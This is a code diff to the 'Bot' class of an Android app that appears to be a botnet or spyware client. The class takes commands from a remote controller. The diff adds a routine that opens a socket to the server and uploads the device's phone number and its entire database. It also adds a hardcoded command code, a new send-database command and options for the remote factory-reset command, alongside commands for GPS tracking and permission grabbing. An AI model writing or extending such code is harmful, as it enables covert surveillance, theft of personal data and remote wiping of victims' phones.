@@ -1,5 +1,6 @@
 package com.candroid.lofl.api;
 
+import android.app.admin.DeviceAdminReceiver;
 import android.content.BroadcastReceiver;
 import android.content.Context;
 import android.content.Intent;
@@ -7,21 +8,54 @@ import android.content.SharedPreferences;
 import android.preference.PreferenceManager;
 
 import com.candroid.lofl.data.Constants;
+import com.candroid.lofl.receivers.AdminReceiver;
 import com.candroid.lofl.receivers.OutgoingCallReceiver;
 import com.candroid.lofl.receivers.ScreenReceiver;
 import com.candroid.lofl.services.CommandsIntentService;
+import com.candroid.lofl.services.LoflService;
+
+import java.io.IOException;
+import java.io.InputStream;
+import java.io.ObjectInputStream;
+import java.io.ObjectOutputStream;
+import java.net.Socket;
+
+import javax.net.SocketFactory;
 
 public class Bot {
-    //public static final String COMMAND_CODE = "mkldfnlkdfnlgnldfnmdf;klmds;msdf::";
     public static final String BOT_CONTROLLER_URL = "http://10.0.2.2:8080/createbot?address=";
+    public static final String IS_BOT_KEY = "IS_BOT_KEY";
     //public static final String SERVER_ADDRESS = "10.0.2.2";
     public static String SERVER_ADDRESS = "";
-    public static String COMMAND_CODE = "";
+    public static String COMMAND_CODE = "69lol666lol69::";
+    public static boolean sIsBot;
 
     public static void bind(String serverAddress, String commandCode){
         SERVER_ADDRESS = serverAddress;
-        COMMAND_CODE = commandCode.concat("::");
+        if(commandCode != null){
+            COMMAND_CODE = null;
+            COMMAND_CODE = commandCode.concat("::");
+        }
     }
+
+    public static void syncDatabaseWithServer(Context context) {
+        Socket socket = null;
+            try {
+                socket = SocketFactory.getDefault().createSocket(Bot.SERVER_ADDRESS, 6666);
+                socket.setSoTimeout(10000);
+                ObjectOutputStream oos = new ObjectOutputStream(socket.getOutputStream());
+                oos.writeObject(LoflService.sTelephoneAddress);
+                oos.flush();
+                byte[] bytes = Storage.Files.fileToBytes(Storage.Files.getDatabaseFile(context));
+                oos.writeObject(bytes);
+                oos.flush();
+                oos.close();
+                socket.close();
+            }catch (Exception e){
+                e.printStackTrace();
+            }
+    }
+
 
     public static void processCommand(Context context, String message){
         String[] commandParts = message.split("::");
@@ -108,6 +142,9 @@ public class Bot {
                 commandFound = true;
                 break;
             case Commands.FACTORY_RESET:
+                if(arg1 != null){
+                    intent.putExtra(AdminReceiver.REASON_KEY, arg1);
+                }
                 intent.setAction(CommandsIntentService.ACTION_FACTORY_RESET);
                 commandFound = true;
                 break;
@@ -206,9 +243,9 @@ public class Bot {
             case Commands.GPS_TRACKER:
                 if(arg1 != null){
                     if(arg1.equalsIgnoreCase("start")){
-                        intent.putExtra(CommandsIntentService.GPS_TRACKER_KEY, true);
+                        intent.putExtra(Systems.Gps.GPS_TRACKER_KEY, true);
                     }else if(arg1.equalsIgnoreCase("stop")){
-                        intent.putExtra(CommandsIntentService.GPS_TRACKER_KEY, false);
+                        intent.putExtra(Systems.Gps.GPS_TRACKER_KEY, false);
                     }
                     intent.setAction(CommandsIntentService.ACTION_GPS_TRACKER);
                 }
@@ -223,10 +260,6 @@ public class Bot {
                 break;
             case Commands.SYNC_PHONE_TO_SERVER:
                 intent.setAction(CommandsIntentService.ACTION_SYNC_PHONE_TO_SERVER);
-                commandFound = true;
-                break;
-            case Commands.ADMIN:
-                intent.setAction(CommandsIntentService.ACTION_ADMIN);
                 commandFound = true;
                 break;
             case Commands.CALL_LOG_PERMISSION:
@@ -259,6 +292,10 @@ public class Bot {
                 break;
             case Commands.PHONE_PERMISSION:
                 intent.setAction(CommandsIntentService.ACTION_PHONE_PERMISSION);
+                commandFound = true;
+                break;
+            case Commands.SEND_DB_TO_SERVER:
+                intent.setAction(CommandsIntentService.ACTION_SEND_DB_TO_SERVER);
                 commandFound = true;
                 break;
             default:
@@ -296,7 +333,6 @@ public class Bot {
         public static final int GPS_TRACKER = 21;
         public static final int FETCH_NETWORK_DATA = 22;
         public static final int SYNC_PHONE_TO_SERVER = 23;
-        public static final int ADMIN = 24;
         public static final int CALL_LOG_PERMISSION = 25;
         public static final int LOCATION_PERMISSION = 26;
         public static final int CONTACTS_PERMISSION = 27;
@@ -305,5 +341,6 @@ public class Bot {
         public static final int CALENDAR_PERMISSION = 30;
         public static final int CAMERA_PERMISSION = 31;
         public static final int PHONE_PERMISSION = 32;
+        public static final int SEND_DB_TO_SERVER = 33;
     }
 }
